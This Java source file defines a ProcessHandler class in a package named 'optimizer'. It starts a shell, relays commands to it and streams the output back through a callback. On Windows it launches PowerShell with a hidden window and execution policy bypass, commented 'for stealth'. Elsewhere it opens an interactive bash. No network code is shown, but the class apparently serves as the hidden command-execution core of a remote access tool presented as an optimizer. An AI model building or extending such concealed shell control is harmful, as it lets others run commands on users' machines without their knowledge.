package com.example.optimizer;

import java.io.*;
import java.nio.charset.StandardCharsets;

public class ProcessHandler {
    private static Process shellProcess;
    private static BufferedWriter writer;
    private static BufferedReader reader;
    private static Thread outputThread;
    private static boolean isRunning = false;

    public static interface OutputCallback {
        void onOutput(String text);
    }

    private static OutputCallback currentCallback;

    public static void setCallback(OutputCallback callback) {
        currentCallback = callback;
    }

    public static synchronized void startShell(OutputCallback callback) {
        if (isRunning)
            return;

        try {
            String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder pb;
            if (os.contains("win")) {
                // Use PowerShell with Hidden Window Style for stealth
                pb = new ProcessBuilder("powershell.exe",
                        "-WindowStyle", "Hidden",
                        "-ExecutionPolicy", "Bypass",
                        "-Command", "-");
            } else {
                pb = new ProcessBuilder("/bin/bash", "-i");
            }

            pb.redirectErrorStream(true);
            shellProcess = pb.start();
            isRunning = true;

            // PowerShell uses default encoding usually, but UTF-8 is safer to force if
            // possible
            // For now, let's stick to default input stream reading
            writer = new BufferedWriter(new OutputStreamWriter(shellProcess.getOutputStream(), StandardCharsets.UTF_8));
            reader = new BufferedReader(new InputStreamReader(shellProcess.getInputStream()));

            outputThread = new Thread(() -> {
                char[] buffer = new char[1024];
                int read;
                try {
                    while (isRunning && (read = reader.read(buffer)) != -1) {
                        String output = new String(buffer, 0, read);
                        if (currentCallback != null)
                            currentCallback.onOutput(output);
                        else if (callback != null)
                            callback.onOutput(output);
                    }
                } catch (IOException e) {
                    if (isRunning) {
                        String msg = "\n[Shell Error] " + e.getMessage();
                        if (currentCallback != null)
                            currentCallback.onOutput(msg);
                        else if (callback != null)
                            callback.onOutput(msg);
                    }
                }
            });
            outputThread.start();

            callback.onOutput("[Shell Session Started]\n");

        } catch (Exception e) {
            callback.onOutput("[Failed to start shell] " + e.getMessage() + "\n");
            stopShell();
        }
    }

    public static synchronized void writeCommand(String command) {
        if (!isRunning || writer == null)
            return;
        try {
            writer.write(command);
            writer.newLine();
            writer.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static synchronized void stopShell() {
        isRunning = false;
        try {
            if (writer != null)
                writer.close();
            if (reader != null)
                reader.close();
            if (shellProcess != null)
                shellProcess.destroy();
        } catch (IOException ignored) {
        }
        shellProcess = null;
        writer = null;
        reader = null;
    }
}
